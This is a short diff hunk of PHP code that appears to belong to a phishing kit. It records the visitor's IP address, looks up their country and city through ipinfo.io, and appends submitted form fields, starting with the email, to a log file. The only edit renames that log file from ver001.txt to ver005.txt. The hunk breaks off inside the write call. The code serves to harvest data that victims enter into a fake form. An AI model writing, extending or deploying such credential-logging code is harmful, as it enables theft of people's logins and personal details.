@@ -8,7 +8,7 @@ $userp = $_SERVER['REMOTE_ADDR'];
 $cc = trim(file_get_contents("http://ipinfo.io/{$userp}/country"));
 $city = trim(file_get_contents("http://ipinfo.io/{$userp}/city"));
 	
-	$file = fopen("ver001.txt", "a");
+	$file = fopen("ver005.txt", "a");
 	
 fwrite($file, 
 "* EMAIL: ".$_POST['email']."
